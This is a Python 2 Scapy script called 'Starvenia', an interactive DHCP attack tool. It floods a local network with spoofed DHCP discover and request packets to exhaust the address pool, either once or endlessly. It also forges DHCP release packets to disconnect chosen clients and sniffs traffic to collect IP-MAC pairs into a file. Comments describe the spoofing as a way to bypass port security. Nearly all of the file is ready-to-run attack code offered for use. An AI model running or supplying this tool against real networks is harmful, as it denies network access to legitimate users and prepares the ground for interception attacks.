from scapy.all import *
from scapy.layers.inet import Ether, IP, UDP
from scapy.layers.dhcp import DHCP, BOOTP
import socket 
import threading
from time import sleep
import netifaces
import keyboard

# Create global variables 
spoofed_chaddr_list = []
leased_ip_list = []
interface = conf.iface
source_mac = get_if_hwaddr(interface)

release_mac_list = []
release_ip_list = []
gws=netifaces.gateways()
server_ip = gws['default'].values()[0][0]


# Create Class (OOP Design)
class Starvenia(threading.Thread):

    def __init__(self):
        # Utilize threading to run sniff and send_discover function at the same time 
        t = threading.Thread(target = self.sniff)
        t2 = threading.Thread(target = self.send_discover)

        # Run packet sniffer first before the sending out discover packets
        t.start()
        sleep(2) 
        t2.start()

    # Send discover packets 
    def send_discover(self):
        print ""
        print "Starting Starvation"
        print ""
        for i in range(255):
            # Generate transaction id
            transaction_id = random.randint(1, 900000000)
            # Generate fake CHADDR
            spoofed_chaddr = str(RandMAC())
            while spoofed_chaddr in spoofed_chaddr_list:
                print "Duplicate SPOOF CHADDR detected, generating a new one"
                spoofed_chaddr = str(RandMAC())
            spoofed_chaddr_list.append(spoofed_chaddr)

            # Create discover packet, specifying source mac to bypass port security
            discover_packet = Ether(src=source_mac,dst="ff:ff:ff:ff:ff:ff")
            discover_packet /= IP(src="0.0.0.0", dst="255.255.255.255")
            discover_packet /= UDP(sport=68, dport=67)
            discover_packet /= BOOTP(chaddr=spoofed_chaddr, xid=transaction_id)
            discover_packet /= DHCP(options=[("message-type", "discover"), "end"])

            sendp(discover_packet, iface=interface, verbose=0)
            sleep(0.01)

    # Sniffed packet analysis + send request packet
    def packet_analyzer(self, packet):

        # Check for DHCP packet
        if DHCP in packet:

            # Check for Offer message
            if packet[DHCP].options[0][1] == 2:

                server_ip = packet[IP].src
                client_mac = packet[BOOTP].chaddr
                offered_ip = packet[BOOTP].yiaddr
                transaction_id = packet[BOOTP].xid

                # Create request packet, specifying source mac to bypass port security
                request_packet = Ether(src=source_mac,dst="ff:ff:ff:ff:ff:ff")
                request_packet /= IP(src="0.0.0.0", dst="255.255.255.255")
                request_packet /= UDP(sport=68, dport=67)
                request_packet /= BOOTP(chaddr=client_mac, xid=transaction_id)
                request_packet /= DHCP(options=[("message-type", "request"), ("server_id", server_ip), ("requested_addr", offered_ip), "end"])

                sendp(request_packet, iface=interface, verbose=0)

            # Check for ACK message
            elif packet[DHCP].options[0][1] == 5:
                client_mac = packet[BOOTP].chaddr
                leased_ip = packet[BOOTP].yiaddr
                leased_ip_list.append(leased_ip)
                print leased_ip + " has been leased to " + client_mac + ". Total IPs leased: " + str(len(leased_ip_list))

            # Check for NAK message
            elif packet[DHCP].options[0][1] == 6:
                print " NAK Received" 


    # Sniff function to listen for traffic
    def sniff(self):
        sniff(filter="udp and (port 67 or 68)", prn=self.packet_analyzer, timeout=40)
        print "Starvation has Ended"
        starve_menu()


class Starvenia2(threading.Thread):

    def __init__(self):
        # Utilize threading to run sniff and send_discover function at the same time 
        t = threading.Thread(target = self.sniff)
        t2 = threading.Thread(target = self.send_discover2)

        # Run packet sniffer first before the sending out discover packets
        t.start()
        sleep(2) 
        t2.start()
    
    def send_discover2(self):
        print ""
        print "Starting Endless Starvation, Press e to exit"
        print ""
        packet_number = 0
        while True:
            for i in range(255):
                if keyboard.is_pressed('e'):
                    print "\nEndless Starvation Ended." + str(packet_number) + " Discover Packets sent"
                    print "Close terminal to exit properly"
                    sys.exit()
                # Generate transaction id
                transaction_id = random.randint(1, 900000000)
                # Generate fake CHADDR
                spoofed_chaddr = str(RandMAC())
                while spoofed_chaddr in spoofed_chaddr_list:
                    print "Duplicate SPOOF CHADDR detected, generating a new one"
                    spoofed_chaddr = str(RandMAC())
                spoofed_chaddr_list.append(spoofed_chaddr)

                # Create discover packet, specifying source mac to bypass port security
                discover_packet = Ether(src=source_mac,dst="ff:ff:ff:ff:ff:ff")
                discover_packet /= IP(src="0.0.0.0", dst="255.255.255.255")
                discover_packet /= UDP(sport=68, dport=67)
                discover_packet /= BOOTP(chaddr=spoofed_chaddr, xid=transaction_id)
                discover_packet /= DHCP(options=[("message-type", "discover"), "end"])

                sendp(discover_packet, iface=interface, verbose=0)
                packet_number += 1
                sleep(0.01)


    # Sniffed packet analysis + send request packet
    def packet_analyzer(self, packet):

        # Check for DHCP packet
        if DHCP in packet:

            # Check for Offer message
            if packet[DHCP].options[0][1] == 2:

                server_ip = packet[IP].src
                client_mac = packet[BOOTP].chaddr
                offered_ip = packet[BOOTP].yiaddr
                transaction_id = packet[BOOTP].xid

                # Create request packet, specifying source mac to bypass port security
                request_packet = Ether(src=source_mac,dst="ff:ff:ff:ff:ff:ff")
                request_packet /= IP(src="0.0.0.0", dst="255.255.255.255")
                request_packet /= UDP(sport=68, dport=67)
                request_packet /= BOOTP(chaddr=client_mac, xid=transaction_id)
                request_packet /= DHCP(options=[("message-type", "request"), ("server_id", server_ip), ("requested_addr", offered_ip), "end"])

                sendp(request_packet, iface=interface, verbose=0)

            # Check for ACK message
            elif packet[DHCP].options[0][1] == 5:
                client_mac = packet[BOOTP].chaddr
                leased_ip = packet[BOOTP].yiaddr
                leased_ip_list.append(leased_ip)
                print leased_ip + " has been leased to " + client_mac + ". Total IPs leased: " + str(len(leased_ip_list))

            # Check for NAK message
            elif packet[DHCP].options[0][1] == 6:
                print "NAK Received" 


    # Sniff function to listen for traffic
    def sniff(self):
        sniff(filter="udp and (port 67 or 68)", prn=self.packet_analyzer)
        starve_menu()


# Release Function

class Releaser:

    def release(self, serverIP, releaseIP, releaseMAC):
        releaseMACraw = mac2str(releaseMAC)
        dhcp_release = IP(dst=serverIP)
        dhcp_release /= UDP(sport=68, dport=67)
        dhcp_release /= BOOTP(chaddr=releaseMACraw, ciaddr=releaseIP, xid=random.randint(1, 900000000))
        dhcp_release /= DHCP(options=[('message-type', 'release'), ("server_id", serverIP), ('client-identifier', releaseMACraw), 'end'])
        send(dhcp_release, verbose=0)
        print releaseIP + " has been released"
        starve_menu()

# Sniff Function (UDP + TCP)
class Snifferlee:
    
    def __init__(self):
        self.sniffer()

    def packet_analyzer2(self, packet):
        client_mac = packet[Ether].src
        client_ip = packet[0][1].src
        if (client_ip not in release_ip_list) and (client_mac not in release_mac_list) and (client_ip !=server_ip):
            release_ip_list.append(client_ip)
            release_mac_list.append(client_mac)
            print "Added " + client_ip + " : " + client_mac
            # Add the recorded IP and Mac into the 2 lists, the If condition make sure the server's IP / MAC is added inside

    def sniffer(self):
        print ""
        print "The Gateway is " + server_ip
        # timer = input("Enter sniffing duration (seconds): ")
        sniff(filter="tcp or udp or icmp", prn=self.packet_analyzer2, timeout=60)
        f = open('Sniffed.txt', 'w+')
        f.write("IP Address :   MAC\n")
        for i in range(0, len(release_ip_list)):
            f.write(release_ip_list[i] + "\t")
            f.write(release_mac_list[i] + "\n")
        f.close()    
        print "Sniffing has ended, saved to Sniffed.txt"
        starve_menu()

# Menu UI
def starve_menu():
    print ""
    print "************STARVENIA**************"
    print "************MAIN MENU**************"
    choice = raw_input("""
    A: DHCP Starvation
    B: DHCP Endless Starvation
    C: IP-MAC Release
    D: Sniff IP-MAC (TCP + UDP)
    E: Exit

    Enter your choice: """)

    if choice == "A" or choice =="a":
        starve = Starvenia()
    elif choice=="B" or choice=="b":
        starve2 = Starvenia2()
    elif choice == "C" or choice =="c":
        releaseIP = raw_input("Enter IP of client to release: ")
        releaseMAC = raw_input("Enter MAC of client to release: ")
        release = Releaser()
        release.release(server_ip, releaseIP, releaseMAC)
    elif choice == "D" or choice =="d":
        sniff = Snifferlee()
    elif choice=="E" or choice=="e":
        sys.exit()
    else:
        print("Invalid input, please try again")
        starve_menu()


starve_menu()
